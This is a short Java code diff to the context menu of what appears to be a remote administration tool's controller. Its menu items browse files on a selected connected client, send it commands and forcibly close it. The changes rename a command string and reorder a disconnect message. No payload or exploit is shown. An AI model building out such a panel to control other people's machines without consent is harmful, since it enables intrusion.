@@ -29,8 +29,7 @@ class IPContextMenu implements Repository {
         MenuItem sb1 = new MenuItem("File Explorer");
         sb1.setOnAction(event -> {
             ClientObject clientObject = ((ClientObject) n.getTableView().getSelectionModel().getSelectedItem());
-            clientObject.clientCommunicate("FILES");
-
+            clientObject.clientCommunicate("FILELIST");
         });
         MenuItem sb2 = new MenuItem("Send Command");
         sb2.setOnAction(event -> {
@@ -71,13 +70,13 @@ class IPContextMenu implements Repository {
             ClientObject clientObject = ((ClientObject) n.getTableView().getSelectionModel().getSelectedItem());
             try {
                 if (clientObject.getClient() != null) {
+                    ((ClientObject) n.getTableRow().getItem()).clientCommunicate("forciblyclose");
                     if (clientObject.getClient().isConnected()) {
                         clientObject.getClient().close();
                     }
                 }
                 PseudoBase.getMausData().remove(clientObject.getIP());
                 CONNECTIONS.remove(clientObject.getIP());
-                ((ClientObject) n.getTableRow().getItem()).clientCommunicate("forciblyclose");
                 Controller.updateStats();
                 Controller.updateTable();
             } catch (IOException e1) {
